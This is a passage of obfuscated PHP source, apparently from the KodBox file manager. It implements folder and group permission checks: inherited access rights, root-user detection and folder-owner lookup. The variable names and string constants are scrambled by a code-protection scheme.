$_SERVER[ñ÷§¡å]; $¿Õ“ÃîÓ = Model($õ§ûç•[544])->getInfo($æŞÀ¦œ°); if (!$æŞÀ¦œ° || !$©Œœ°ÎÆ || !$¿Õ“ÃîÓ) { return array(); } $ûÉÎĞô¤ = Model($õ§ûç•[1334])->sourceInfo($©Œœ°ÎÆ); $Åùˆ÷© = array(); $Œ¨†˜ëµ = 1; if ($ûÉÎĞô¤[$õ§ûç•[441]] == $õ§ûç•[207] && $ûÉÎĞô¤[$õ§ûç•[514]] != $Œ¨†˜ëµ && $this->groupContainUser($ûÉÎĞô¤[$õ§ûç•[514]], $æŞÀ¦œ°)) { foreach ($¿Õ“ÃîÓ[$õ§ûç•[2018]] as $¸œêñæØ) { $İŒô¥”à = Model($õ§ûç•[531])->getInfo($¸œêñæØ[$õ§ûç•[1835]]); $Ï¹ãÍÛÆ = Model($õ§ûç•[544])->getInfoSimpleOuter($æŞÀ¦œ°); $Ï¹ãÍÛÆ[$õ§ûç•[476]] = $¸œêñæØ[$õ§ûç•[422]]; if (Model($õ§ûç•[516])->authCheckAction($¸œêñæØ[$õ§ûç•[422]][$õ§ûç•[422]], $õ§ûç•[1856])) { continue; } $Á¿ØĞîí = array($õ§ûç•[32] => $õ§ûç•[1611] . $İŒô¥”à[$õ§ûç•[32]], $õ§ûç•[411] => $İŒô¥”à[$õ§ûç•[96]][$õ§ûç•[411]], $õ§ûç•[94] => KodIO::make($İŒô¥”à[$õ§ûç•[96]][$õ§ûç•[411]]), $õ§ûç•[441] => $õ§ûç•[207], $õ§ûç•[420] => $õ§ûç•[524], $õ§ûç•[33] => $õ§ûç•[563], $õ§ûç•[528] => $İŒô¥”à[$õ§ûç•[535]], $õ§ûç•[1835] => $İŒô¥”à[$õ§ûç•[1835]], $õ§ûç•[532] => $İŒô¥”à[$õ§ûç•[441]], $õ§ûç•[2015] => array($Ï¹ãÍÛÆ)); $Åùˆ÷©[$Á¿ØĞîí[$õ§ûç•[411]]] = $Á¿ØĞîí; } } $øì‘ÄÑ× = array(); $ÄŒ‘Ò» = $this->getAllChildren($©Œœ°ÎÆ); foreach ($ÄŒ‘Ò» as $é‹ Ààà) { $²ºé–à° = !1; foreach ($é‹ Ààà[$õ§ûç•[2015]] as $øµã”–) { if ($øµã”–[$õ§ûç•[1663]]) { if ($øµã”–[$õ§ûç•[1663]] == $æŞÀ¦œ°) { $²ºé–à° = !0; break; } } if ($øµã”–[$õ§ûç•[1835]]) { if ($this->groupContainUser($øµã”–[$õ§ûç•[1835]], $æŞÀ¦œ°)) { $²ºé–à° = !0; break; } } } if ($²ºé–à°) { $øì‘ÄÑ×[] = $é‹ Ààà; } $­¯€æ¼õ = $é‹ Ààà[$õ§ûç•[411]]; if (isset($Åùˆ÷©[$­¯€æ¼õ])) { $é‹ Ààà[$õ§ûç•[2015]][] = $Åùˆ÷©[$­¯€æ¼õ][0]; $Åùˆ÷©[$­¯€æ¼õ] = !1; } } $Åùˆ÷© = array_filter(array_values($Åùˆ÷©)); $øì‘ÄÑ× = array_merge($Åùˆ÷©, $øì‘ÄÑ×); return $øì‘ÄÑ×; } public function setAllChildrenByUser($÷º¥Ôê¿, $õ†óÂ›, $ª„œ·ú¢) { $òäåÂå =& $_SERVER[ñ÷§¡å]; $­º€šãİ = $this->getAllChildrenByUser($÷º¥Ôê¿, $õ†óÂ›); if (!$ª„œ·ú¢ || !$­º€šãİ) { return !1; } foreach ($­º€šãİ as $åíÇÏÓü) { $Ù¶™³¨  = array(); foreach ($åíÇÏÓü[$òäåÂå[2015]] as $é³ö…ÒÙ) { $ˆØáµÊç = $é³ö…ÒÙ[$òäåÂå[476]]; $ù‹ˆÑ½ = $é³ö…ÒÙ[$òäåÂå[1663]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÎÒ±Áº = $é³ö…ÒÙ[$òäåÂå[1663]] ? $é³ö…ÒÙ[$òäåÂå[1663]] : $é³ö…ÒÙ[$òäåÂå[1835]]; if ($é³ö…ÒÙ[$òäåÂå[1663]] && $é³ö…ÒÙ[$òäåÂå[1663]] == $õ†óÂ›) { continue; } $Ù¶™³¨ [] = array($òäåÂå[411] => $åíÇÏÓü[$òäåÂå[411]], $òäåÂå[420] => $ù‹ˆÑ½, $òäåÂå[514] => intval($ÎÒ±Áº), $òäåÂå[1939] => isset($ˆØáµÊç[$òäåÂå[408]]) ? intval($ˆØáµÊç[$òäåÂå[408]]) : 0, $òäåÂå[1995] => isset($ˆØáµÊç[$òäåÂå[1995]]) ? intval($ˆØáµÊç[$òäåÂå[1995]]) : -1); } $Ù¶™³¨ [] = array($òäåÂå[411] => $åíÇÏÓü[$òäåÂå[411]], $òäåÂå[420] => SourceModel::TYPE_USER, $òäåÂå[514] => intval($õ†óÂ›), $òäåÂå[1939] => intval($ª„œ·ú¢), $òäåÂå[1995] => -1); $this->where(array($òäåÂå[426] => $åíÇÏÓü[$òäåÂå[411]]))->delete(); $this->addAll($Ù¶™³¨ ); } return !0; } public function get($“ÎÀ¥ä¼) { $õ°Áø—® = $this->getSourceList(array($“ÎÀ¥ä¼), !0); return $õ°Áø—®[0]; } public function getSourceList($ıöÉÌÌÙ, $ƒš×İ¦Ü = false, $ÂÚÀ›æ¶ = false) { $íóŒ¸Ëò =& $_SERVER[ñ÷§¡å]; if (!$ıöÉÌÌÙ) { return array(); } $šãÔñ¿ = Model($íóŒ¸Ëò[1334]); if (!$ƒš×İ¦Ü && count($ıöÉÌÌÙ) == 1) { $ƒš×İ¦Ü = array(); $ƒš×İ¦Ü[$ıöÉÌÌÙ[0]] = $šãÔñ¿->sourceInfo($ıöÉÌÌÙ[0]); } if (!$ƒš×İ¦Ü) { $”Ò—¡‚¿ = array($íóŒ¸Ëò[426] => array($íóŒ¸Ëò[427], $ıöÉÌÌÙ)); $ƒš×İ¦Ü = $šãÔñ¿->field($íóŒ¸Ëò[2019])->where($”Ò—¡‚¿)->select(); $ƒš×İ¦Ü = array_to_keyvalue($ƒš×İ¦Ü, $íóŒ¸Ëò[411]); } $ªóƒÈÁ™ = $ıöÉÌÌÙ; foreach ($ƒš×İ¦Ü as $×¨ßÌ“¿ => $‚£í¯Áõ) { $÷œÂ¢ÖÒ = $šãÔñ¿->parentLevelArray($‚£í¯Áõ[$íóŒ¸Ëò[530]]); $ªóƒÈÁ™ = array_merge($ªóƒÈÁ™, array($×¨ßÌ“¿), array_reverse($÷œÂ¢ÖÒ)); } $ªóƒÈÁ™ = array_values(array_unique($ªóƒÈÁ™)); if (!$ªóƒÈÁ™) { return array(); } $¡çÍ´ĞË = $this->sourceAuthSelect($ªóƒÈÁ™); $ˆ½Ñª­‘ = array(); foreach ($ªóƒÈÁ™ as $£ªÊ…‡£) { if (isset($¡çÍ´ĞË[$£ªÊ…‡£])) { $ˆ½Ñª­‘[$£ªÊ…‡£] = $¡çÍ´ĞË[$£ªÊ…‡£]; } } $¹÷¬Ş° = $this->userIsRoot($ÂÚÀ›æ¶); $…‹û¨ú– = AuthModel::authAll(); $õÊÔãª€ = array($íóŒ¸Ëò[423] => $…‹û¨ú–, $íóŒ¸Ëò[2020] => array($íóŒ¸Ëò[428] => 0, $íóŒ¸Ëò[1841] => $…‹û¨ú–, $íóŒ¸Ëò[429] => LNG($íóŒ¸Ëò[2021]), $íóŒ¸Ëò[1858] => $íóŒ¸Ëò[2022])); $•ô×ìÜÖ = array(); foreach ($ƒš×İ¦Ü as $£ªÊ…‡£ => $Á‘­İÀˆ) { if ($¹÷¬Ş° && $GLOBALS[$íóŒ¸Ëò[6]][$íóŒ¸Ëò[1854]]) { $•ô×ìÜÖ[$£ªÊ…‡£] = $õÊÔãª€; continue; } $•ô×ìÜÖ[$£ªÊ…‡£] = $this->makeSourceAuth($Á‘­İÀˆ, $ˆ½Ñª­‘, $ÂÚÀ›æ¶); } return $•ô×ìÜÖ; } public function authDeepCheck($·ö·«Â, $·×ö§¶º = false) { $Á”ä²ÃÃ =& $_SERVER[ñ÷§¡å]; $·×ö§¶º = $·×ö§¶º ? $·×ö§¶º : USER_ID; $™¶ô©Âù = $this->makeAuthDeep($·×ö§¶º); if (!in_array($·ö·«Â, $™¶ô©Âù[$Á”ä²ÃÃ[2023]])) { return !1; } $±îÌÌôù = array(); foreach ($™¶ô©Âù[$Á”ä²ÃÃ[2024]] as $Ğ‚³—åÁ => $‡àù¡üõ) { if (!in_array($·ö·«Â, $‡àù¡üõ)) { continue; } $±îÌÌôù[] = $Ğ‚³—åÁ; } if (!$±îÌÌôù) { return !1; } $òÈ“¹Î¿ = $±îÌÌôù ? $±îÌÌôù[0] : $·ö·«Â; return array($Á”ä²ÃÃ[423] => -1, $Á”ä²ÃÃ[476] => array($Á”ä²ÃÃ[428] => $Á”ä²ÃÃ[1197], $Á”ä²ÃÃ[1841] => $Á”ä²ÃÃ[207], $Á”ä²ÃÃ[429] => LNG($Á”ä²ÃÃ[2025]), $Á”ä²ÃÃ[1858] => $Á”ä²ÃÃ[2026]), $Á”ä²ÃÃ[2027] => LNG($Á”ä²ÃÃ[2028]), $Á”ä²ÃÃ[2029] => $this->sourceAuthInfo($òÈ“¹Î¿)); } protected function makeAuthDeep($Ê¥¤²­ = false) { $“ö¿àåÃ =& $_SERVER[ñ÷§¡å]; static $ï¿®˜€É = array(); $Ê¥¤²­ = $Ê¥¤²­ ? $Ê¥¤²­ : USER_ID; if (isset($ï¿®˜€É[$Ê¥¤²­])) { return $ï¿®˜€É[$Ê¥¤²­]; } $‚ãò»º = Model($“ö¿àåÃ[2030])->listData(); $Ş¬»œó = array(); foreach ($‚ãò»º as $¥ù¬ªí×) { if ($¥ù¬ªí×[$“ö¿àåÃ[422]] == 0 && $¥ù¬ªí×[$“ö¿àåÃ[1857]] == $“ö¿àåÃ[98]) { $Ş¬»œó[] = $¥ù¬ªí×[$“ö¿àåÃ[408]]; } } $µ¥±¡Ò = $this->userGroupParents($Ê¥¤²­); $øßêâµ = array($“ö¿àåÃ[420] => SourceModel::TYPE_USER, $“ö¿àåÃ[514] => $Ê¥¤²­); if ($µ¥±¡Ò) { $øßêâµ = array(array($“ö¿àåÃ[420] => SourceModel::TYPE_USER, $“ö¿àåÃ[514] => $Ê¥¤²­), array($“ö¿àåÃ[420] => SourceModel::TYPE_GROUP, $“ö¿àåÃ[514] => array($“ö¿àåÃ[427], $µ¥±¡Ò)), $“ö¿àåÃ[1007] => $“ö¿àåÃ[1933]); } $¯Ã€¯ÁÖ = $this->field($“ö¿àåÃ[2031])->where($øßêâµ)->select(); $º»ÔüÑ = array(); $½Ù²ââ = array_to_keyvalue_group($¯Ã€¯ÁÖ, $“ö¿àåÃ[411]); foreach ($½Ù²ââ as $‚ğ¶²ã™ => $êöí½óê) { $ßÅ††İŸ = $this->authArrayCheck($êöí½óê, $Ê¥¤²­); if ($ßÅ††İŸ[$“ö¿àåÃ[423]] > 0) { $º»ÔüÑ[] = $‚ğ¶²ã™ . $“ö¿àåÃ[12]; } } if ($µ¥±¡Ò) { $Õ£¦„»¸ = Model($“ö¿àåÃ[531]); foreach ($µ¥±¡Ò as $‚øÔÃ¹Ş) { $‰ÊˆÉò = $Õ£¦„»¸->getInfo($‚øÔÃ¹Ş); if (!$‰ÊˆÉò || !is_array($‰ÊˆÉò[$“ö¿àåÃ[96]])) { continue; } $º»ÔüÑ[] = $‰ÊˆÉò[$“ö¿àåÃ[96]][$“ö¿àåÃ[411]]; } } $’ñè› = array(); $·•Ö›Ø€ = $µ¥±¡Ò; $Ê³à¦ÎÒ = Model($“ö¿àåÃ[1334]); $Õ£¦„»¸ = Model($“ö¿àåÃ[531]); $Õ¡¤¼¦‘ = array(); $®¯®œ½± = array(); $¶–ÖŒ¥Ó = array(); $üÎ¢Œºş = array(); if ($º»ÔüÑ) { $í±»Ö“ = $Ê³à¦ÎÒ->where(array($“ö¿àåÃ[411] => array($“ö¿àåÃ[427], $º»ÔüÑ)))->select(); foreach ($í±»Ö“ as $áÔ¯Æä“) { $ù½²•½ = $Ê³à¦ÎÒ->parentLevelArray($áÔ¯Æä“[$“ö¿àåÃ[530]]); $’ñè› = array_merge($’ñè›, $ù½²•½); $·•Ö›Ø€[] = $áÔ¯Æä“[$“ö¿àåÃ[514]]; $Õ¡¤¼¦‘[$áÔ¯Æä“[$“ö¿àåÃ[411]]] = $ù½²•½; $®¯®œ½±[$áÔ¯Æä“[$“ö¿àåÃ[411]]] = $áÔ¯Æä“[$“ö¿àåÃ[514]]; } } $·•Ö›Ø€ = array_values(array_unique($·•Ö›Ø€)); $öä¬´Èø = $·•Ö›Ø€; foreach ($öä¬´Èø as $‚øÔÃ¹Ş) { $‰ÊˆÉò = $Õ£¦„»¸->getInfo($‚øÔÃ¹Ş); $ù½²•½ = $Ê³à¦ÎÒ->parentLevelArray($‰ÊˆÉò[$“ö¿àåÃ[530]]); $·•Ö›Ø€ = array_merge($·•Ö›Ø€, $ù½²•½); } $·•Ö›Ø€ = array_values(array_unique($·•Ö›Ø€)); foreach ($·•Ö›Ø€ as $‚øÔÃ¹Ş) { $‰ÊˆÉò = $Õ£¦„»¸->getInfo($‚øÔÃ¹Ş); $’ñè›[] = $‰ÊˆÉò[$“ö¿àåÃ[96]][$“ö¿àåÃ[411]]; $¶–ÖŒ¥Ó[$‚øÔÃ¹Ş] = $‰ÊˆÉò[$“ö¿àåÃ[96]][$“ö¿àåÃ[411]]; $üÎ¢Œºş[$‚øÔÃ¹Ş] = $Ê³à¦ÎÒ->parentLevelArray($‰ÊˆÉò[$“ö¿àåÃ[530]]); } foreach ($Õ¡¤¼¦‘ as $åïÎÙƒÌ => $Õ™ê„ŸŠ) { $õêêíôˆ = $®¯®œ½±[$åïÎÙƒÌ]; if (!$õêêíôˆ || !$¶–ÖŒ¥Ó[$õêêíôˆ]) { continue; } $¿ºÉ«¥ã = array(); foreach ($üÎ¢Œºş[$õêêíôˆ] as $‚øÔÃ¹Ş) { $¿ºÉ«¥ã[] = $¶–ÖŒ¥Ó[$‚øÔÃ¹Ş]; } $Õ¡¤¼¦‘[$åïÎÙƒÌ] = array_merge($¿ºÉ«¥ã, $Õ™ê„ŸŠ); } $’ñè› = array_values(array_unique($’ñè›)); $œ¨¤®Éç = array($“ö¿àåÃ[2023] => $’ñè›, $“ö¿àåÃ[2024] => $Õ¡¤¼¦‘); $ï¿®˜€É[$Ê¥¤²­] = $œ¨¤®Éç; return $œ¨¤®Éç; } private function makeSourceAuth($Ó€Åº¬€, $¤›îôûó, $Â²Î©Ğ¢ = false) { $ÔÌöÔÙ =& $_SERVER[ñ÷§¡å]; $ĞßõˆÀ = $ÔÌöÔÙ[98]; $ë¦ó¼Ú³ = $Ó€Åº¬€[$ÔÌöÔÙ[514]]; $ú®Ç—º = $Ó€Åº¬€[$ÔÌöÔÙ[420]] == SourceModel::TYPE_GROUP; $ÒõÌ‘Ó… = $ú®Ç—º ? $this->groupRootAuth($ë¦ó¼Ú³, $Â²Î©Ğ¢) : !1; if ($ÒõÌ‘Ó… && Model($ÔÌöÔÙ[516])->authCheckAction($ÒõÌ‘Ó…[$ÔÌöÔÙ[422]], $ÔÌöÔÙ[1856])) { return $this->groupAuthInfo($ÒõÌ‘Ó…, $ë¦ó¼Ú³); } $Ğà—Ü… = Model($ÔÌöÔÙ[1334])->parentLevelArray($Ó€Åº¬€[$ÔÌöÔÙ[530]]); $Ğà—Ü… = array_merge(array($Ó€Åº¬€[$ÔÌöÔÙ[411]]), array_reverse($Ğà—Ü…)); $ŒÅšª†¸ = !1; foreach ($Ğà—Ü… as $Ù¢…ŞÖ’) { if (!isset($¤›îôûó[$Ù¢…ŞÖ’])) { continue; } $È–©ı²¬ = $this->authMake($¤›îôûó[$Ù¢…ŞÖ’], $Â²Î©Ğ¢); if ($È–©ı²¬[$ÔÌöÔÙ[476]]) { $ŒÅšª†¸ = $È–©ı²¬; break; } } if (!$ú®Ç—º) { return $ŒÅšª†¸; } if (!$ŒÅšª†¸ && $ÒõÌ‘Ó…) { $ŒÅšª†¸ = $this->groupAuthInfo($ÒõÌ‘Ó…, $ë¦ó¼Ú³); } if (!$ŒÅšª†¸) { $ú‘·’ˆ = Model($ÔÌöÔÙ[531])->getInfo($ë¦ó¼Ú³); $Ù¥ØÂ‘ş = explode($ÔÌöÔÙ[50], trim($ú‘·’ˆ[$ÔÌöÔÙ[530]], $ÔÌöÔÙ[50])); $Ù¥ØÂ‘ş = array_reverse($Ù¥ØÂ‘ş); foreach ($Ù¥ØÂ‘ş as $Ù¬–ŠŒ‘) { if ($Ù¬–ŠŒ‘ == $ÔÌöÔÙ[207] || $Ù¬–ŠŒ‘ == $ĞßõˆÀ) { continue; } $÷¢È³üï = $this->groupRootAuth($Ù¬–ŠŒ‘, $Â²Î©Ğ¢); if (!$÷¢È³üï) { continue; } $ŒÅšª†¸ = $this->groupAuthInfo($÷¢È³üï, $Ù¬–ŠŒ‘); break; } } if (!$ŒÅšª†¸ || $ŒÅšª†¸[$ÔÌöÔÙ[423]] <= 0) { $Î¶Ò×Æ’ = $this->authDeepCheck($Ó€Åº¬€[$ÔÌöÔÙ[411]], $Â²Î©Ğ¢); if ($Î¶Ò×Æ’) { $ŒÅšª†¸ = $Î¶Ò×Æ’; } } return $ŒÅšª†¸; } private function userIsRoot($±êæ‡§ = false) { $ç¡«¨¦ã =& $_SERVER[ñ÷§¡å]; if (!$±êæ‡§ && _get($GLOBALS, $ç¡«¨¦ã[512])) { return !0; } $£²òºÀ = Model($ç¡«¨¦ã[544])->getInfo($±êæ‡§); $Àô÷¶†‹ = Model($ç¡«¨¦ã[2032])->listData($£²òºÀ[$ç¡«¨¦ã[1542]]); if ($Àô÷¶†‹ && $Àô÷¶†‹[$ç¡«¨¦ã[520]][$ç¡«¨¦ã[2033]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ãı¬ì»ì) { $±à©Â›Ó =& $_SERVER[ñ÷§¡å]; $ï­şëàê = Model($±à©Â›Ó[1334]); $š•Ğ¿¡ = $ï­şëàê->sourceInfo($Ãı¬ì»ì); if (!$š•Ğ¿¡) { return !1; } $ï­şëàê->groupPathDisplay($š•Ğ¿¡); $ÚƒĞ›¬õ = array($š•Ğ¿¡); $ÚƒĞ›¬õ = $ï­şëàê->_listAppendPath($ÚƒĞ›¬õ); $š•Ğ¿¡ = $ÚƒĞ›¬õ[0]; $˜ĞÏˆğ— = $š•Ğ¿¡[$±à©Â›Ó[528]]; if (isset($š•Ğ¿¡[$±à©Â›Ó[536]])) { $í˜¿ô“ì = explode($±à©Â›Ó[8], trim($š•Ğ¿¡[$±à©Â›Ó[528]], $±à©Â›Ó[8])); array_shift($í˜¿ô“ì); $˜ĞÏˆğ— = $š•Ğ¿¡[$±à©Â›Ó[534]] . $±à©Â›Ó[2034] . implode($±à©Â›Ó[8], $í˜¿ô“ì); } return array($±à©Â›Ó[429] => $š•Ğ¿¡[$±à©Â›Ó[32]], $±à©Â›Ó[94] => KodIO::make($š•Ğ¿¡[$±à©Â›Ó[411]]), $±à©Â›Ó[2035] => $˜ĞÏˆğ—); } private function groupAuthInfo($„çªÚ‹€, $ÌÌŠŞÎà) { $¼²İ¢„ =& $_SERVER[ñ÷§¡å]; $À•Ôä« = Model($¼²İ¢„[531])->getInfo($ÌÌŠŞÎà); return array($¼²İ¢„[2036] => intval($„çªÚ‹€[$¼²İ¢„[422]]), $¼²İ¢„[2020] => $„çªÚ‹€, $¼²İ¢„[2037] => LNG($¼²İ¢„[2038]), $¼²İ¢„[2029] => array($¼²İ¢„[429] => $À•Ôä«[$¼²İ¢„[32]], $¼²İ¢„[94] => KodIO::make($À•Ôä«[$¼²İ¢„[96]][$¼²İ¢„[411]]), $¼²İ¢„[2035] => $À•Ôä«[$¼²İ¢„[535]])); } protected function groupRootAuth($üİÄÛµ , $û¶ÇÓé = false) { $Õ¾µÚœĞ =& $_SERVER[ñ÷§¡å]; $û¶ÇÓé = $û¶ÇÓé ? $û¶ÇÓé : USER_ID; $±èˆĞ® = $û¶ÇÓé . $Õ¾µÚœĞ[2039] . $üİÄÛµ ; static $¡îÂÉÔ­ = array(); if (isset($¡îÂÉÔ­[$±èˆĞ®])) { return $¡îÂÉÔ­[$±èˆĞ®]; } $Ã·¥Ğ¯† = Model($Õ¾µÚœĞ[531])->getInfo($üİÄÛµ ); $¬ğ¢èĞ = $this->userGroupList($û¶ÇÓé); $ËƒÎ˜š = isset($¬ğ¢èĞ[$üİÄÛµ ]) ? $¬ğ¢èĞ[$üİÄÛµ ][$Õ¾µÚœĞ[422]] : !1; if ($ËƒÎ˜š && Model($Õ¾µÚœĞ[516])->authCheckAction($ËƒÎ˜š[$Õ¾µÚœĞ[422]], $Õ¾µÚœĞ[1856])) { $¡îÂÉÔ­[$±èˆĞ®] = $ËƒÎ˜š; return $ËƒÎ˜š; } $¯±’÷Ã = $this->sourceAuthSelect($Ã·¥Ğ¯†[$Õ¾µÚœĞ[96]][$Õ¾µÚœĞ[411]]); $Ôå©óß’ = $¯±’÷Ã ? $this->authMake($¯±’÷Ã, $û¶ÇÓé) : !1; $íÂğ¯Íµ = $Ôå©óß’ ? $Ôå©óß’[$Õ¾µÚœĞ[476]] : !1; $¡îÂÉÔ­[$±èˆĞ®] = $íÂğ¯Íµ ? $íÂğ¯Íµ : $ËƒÎ˜š; return $¡îÂÉÔ­[$±èˆĞ®]; } public function authOwnerApply($»÷àÅ˜) { $•Ø¦¼Æ =& $_SERVER[ñ÷§¡å]; if (empty($»÷àÅ˜[$•Ø¦¼Æ[422]]) || isset($»÷àÅ˜[$•Ø¦¼Æ[2040]]) && $»÷àÅ˜[$•Ø¦¼Æ[2040]]) { return $»÷àÅ˜; } if (AuthModel::authCheckRoot($»÷àÅ˜[$•Ø¦¼Æ[422]][$•Ø¦¼Æ[423]])) { return $»÷àÅ˜; } $ö¬•Çõ¤ = Model($•Ø¦¼Æ[1334])->parentLevelArray($»÷àÅ˜[$•Ø¦¼Æ[530]]); $ö¬•Çõ¤ = array_merge(array($»÷àÅ˜[$•Ø¦¼Æ[411]]), array_reverse($ö¬•Çõ¤)); $’ãºó¯ = $this->sourceAuthSelect($ö¬•Çõ¤); $Û»àé’¹ = array(); $¼ à•¯ì = array(); foreach ($’ãºó¯ as $¸î™ùıè => $äÕŞ¤¢Ç) { $êßœœâ– = $this->authFolderOwnerUser($äÕŞ¤¢Ç); $Û»àé’¹[$¸î™ùıè] = $êßœœâ–; $¼ à•¯ì = array_merge($¼ à•¯ì, $êßœœâ–[$•Ø¦¼Æ[609]]); if ($êßœœâ–[$•Ø¦¼Æ[2041]]) { break; } } if (count($¼ à•¯ì) == 0) { $¼ à•¯ì = $this->authFolderOwnerGroup($»÷àÅ˜[$•Ø¦¼Æ[514]]); } $¼ à•¯ì = array_unique($¼ à•¯ì); if (AuthModel::authCheckRoot($»÷àÅ˜[$•Ø¦¼Æ[422]][$•Ø¦¼Æ[423]])) { $¼ à•¯ì[] = USER_ID; } $»÷àÅ˜[$•Ø¦¼Æ[422]][$•Ø¦¼Æ[2042]] = Model($•Ø¦¼Æ[522])->userListInfo($¼ à•¯ì); return $»÷àÅ˜; } private function authFolderOwnerGroup($ä†‹ÚÔş) { $Š—è¯­è =& $_SERVER[ñ÷§¡å]; $šé ‡É = Model($Š—è¯­è[1925])->where(array($Š—è¯­è[1835] => $ä†‹ÚÔş))->select(); $›ûîŸ‚ = array(); if (!$šé ‡É) { return $›ûîŸ‚; } foreach ($šé ‡É as $ûÂßòò) { $ËÊŸÁÕ„ = $this->authInfo($ûÂßòò); if (AuthModel::authCheckRoot($ËÊŸÁÕ„[$Š—è¯­è[422]])) { $›ûîŸ‚[] = $ûÂßòò[$Š—è¯­è[1663]]; } } return $›ûîŸ‚; } private function authFolderOwnerUser($„È¼ƒùØ) { $‰ä–£÷Ü =& $_SERVER[ñ÷§¡å]; $İÏ–õº¶ = array(); $ÈÍğëó´ = !1; foreach ($„È¼ƒùØ as $¯ìÃãàô) { $Õ­¦ Ş° = $this->authInfo($¯ìÃãàô); if ($¯ìÃãàô[$‰ä–£÷Ü[514]] == $‰ä–£÷Ü[207]) { $ÈÍğëó´ = !0; } if ($¯ìÃãàô[$‰ä–£÷Ü[420]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Õ­¦ Ş°[$‰ä–£÷Ü[422]])) { $İÏ–õº¶[] = $¯ìÃãàô[$‰ä–£÷Ü[514]]; } } } return array($‰ä–£÷Ü[609] => $İÏ–õº¶, $‰ä–£÷Ü[2041] => $ÈÍğëó´); } public function authMake($İß¡Õòê, $”¯îúñ = false) { $ÌşŠ“¨Ã =& $_SERVER[ñ÷§¡å]; $ÆßÁ™¾£ = $this->authArrayCheck($İß¡Õòê, $”¯îúñ); if ($ÆßÁ™¾£[$ÌşŠ“¨Ã[2043]]) { $ÆßÁ™¾£[$ÌşŠ“¨Ã[2043]] = $this->sourceAuthInfo($ÆßÁ™¾£[$ÌşŠ“¨Ã[2043]]); } return $ÆßÁ™¾£; } public function authArrayCheck($éˆãÖ¾æ, $ Ğ¾“‹Á = false) { $¬ßæ¥å =& $_SERVER[ñ÷§¡å]; if (!$éˆãÖ¾æ) { return array($¬ßæ¥å[423] => 0, $¬ßæ¥å[476] => !1); } $ Ğ¾“‹Á = $ Ğ¾“‹Á ? $ Ğ¾“‹Á : USER_ID; $†Ñ‚¾êë = 0; $ÄÄíºÚå = 0; $ÁÖ€ê¡» = 0; $ŒÍƒà¢¥ = 0; $ÂôãÑ¶ï = 0; $şø‡»ÇŸ = 0; $¤¦ÜÕ… = 1000; $¹‘«ë„ = 0; $æï¥¦üë = 0; $õ‰Ê’ÏÚ = 0; $ÑêÀşÀ¡ = 0; $æò€àèë = array($¬ßæ¥å[411] => 0); foreach ($éˆãÖ¾æ as $æò€àèë) { $ŸĞÒ‚Ë„ = $this->authInfo($æò€àèë); if (!$ŸĞÒ‚Ë„) { continue; } $£°öÑˆ = $æò€àèë[$¬ßæ¥å[514]]; $ÀóîåÆ’ = intval($ŸĞÒ‚Ë„[$¬ßæ¥å[422]]); if ($æò€àèë[$¬ßæ¥å[420]] == SourceModel::TYPE_USER && $£°öÑˆ == $ Ğ¾“‹Á) { $†Ñ‚¾êë = !0; $ÁÖ€ê¡» = $ŸĞÒ‚Ë„; $ÄÄíºÚå = $ÀóîåÆ’; } else { if ($æò€àèë[$¬ßæ¥å[420]] == SourceModel::TYPE_GROUP && $this->groupContainUser($£°öÑˆ, $ Ğ¾“‹Á)) { $ŒÍƒà¢¥ = !0; $´Û³¼ú = $this->groupStepToUserGroup($£°öÑˆ, $ Ğ¾“‹Á); if ($´Û³¼ú < $¤¦ÜÕ…) { $¤¦ÜÕ… = $´Û³¼ú; $ÂôãÑ¶ï = $ÀóîåÆ’; $şø‡»ÇŸ = $ŸĞÒ‚Ë„; $¹‘«ë„ = $£°öÑˆ; } if ($´Û³¼ú == $¤¦ÜÕ… && $ÀóîåÆ’ >= $ÂôãÑ¶ï) { $ÂôãÑ¶ï = $ÀóîåÆ’; $şø‡»ÇŸ = $ŸĞÒ‚Ë„; $¹‘«ë„ = $£°öÑˆ; } } else { if ($£°öÑˆ == $¬ßæ¥å[207]) { $æï¥¦üë = !0; $ÑêÀşÀ¡ = $ŸĞÒ‚Ë„; $õ‰Ê’ÏÚ = $ÀóîåÆ’; } } } } if ($†Ñ‚¾êë) { $¾á¤›É = $ÄÄíºÚå; $ŸĞÒ‚Ë„ = $ÁÖ€ê¡»; $ø€Ùş›­ = LNG($¬ßæ¥å[2044]); } else { if ($ŒÍƒà¢¥) { $¾á¤›É = $ÂôãÑ¶ï; $ŸĞÒ‚Ë„ = $şø‡»ÇŸ; $±ŸÇ€’è = Model($¬ßæ¥å[531])->getInfo($¹‘«ë„); $ø€Ùş›­ = $¬ßæ¥å[172] . $±ŸÇ€’è[$¬ßæ¥å[535]] . $¬ßæ¥å[2045] . LNG($¬ßæ¥å[2046]); } else { if ($æï¥¦üë) { $¾á¤›É = $õ‰Ê’ÏÚ; $ŸĞÒ‚Ë„ = $ÑêÀşÀ¡; $ø€Ùş›­ = LNG($¬ßæ¥å[2017]); } else { $¾á¤›É = 0; $ŸĞÒ‚Ë„ = !1; $ø€Ùş›­ = $¬ßæ¥å[12]; } } } $©Ó¦°¶¤ = array($¬ßæ¥å[2036] => intval($¾á¤›É), $¬ßæ¥å[2020] => $ŸĞÒ‚Ë„, $¬ßæ¥å[2037] => $ø€Ùş›­, $¬ßæ¥å[2029] => $æò€àèë[$¬ßæ¥å[411]]); return $©Ó¦°¶¤; } private function groupContainUser($¾¢·¢ê, $íıªÁù³ = false) { return in_array($¾¢·¢ê, $this->userGroupParents($íıªÁù³)); } private function groupStepToUserGroup($‚œÒç™õ, $èıÑæõ’ = false) { $«ÖáØ£˜ =& $_SERVER[ñ÷§¡å]; $øÈ–¾ô = $this->userGroupList($èıÑæõ’); $“±ûëı = 1000; $á¨±—¯Ù = $GLOBALS[$«ÖáØ£˜[6]][$«ÖáØ£˜[99]][$«ÖáØ£˜[1938]] == 1; $í‰ÌÖ‘ª = $á¨±—¯Ù ? 3 : 2; foreach ($øÈ–¾ô as $Î©ÍÀÂ) { if ($Î©ÍÀÂ[$«ÖáØ£˜[1835]] == $‚œÒç™õ) { return 0; } $èşË™ã“ = explode($«ÖáØ£˜[50], trim($Î©ÍÀÂ[$«ÖáØ£˜[530]], $«ÖáØ£˜[50])); if ($èşË™ã“[0] == $«ÖáØ£˜[207] && count($èşË™ã“) > $í‰ÌÖ‘ª) { $¹§ãúŞÈ = array_reverse(array_slice($èşË™ã“, $í‰ÌÖ‘ª)); $é™ù©™¯ = array_search($‚œÒç™õ, $¹§ãúŞÈ); if ($é™ù©™¯ !== !1 && 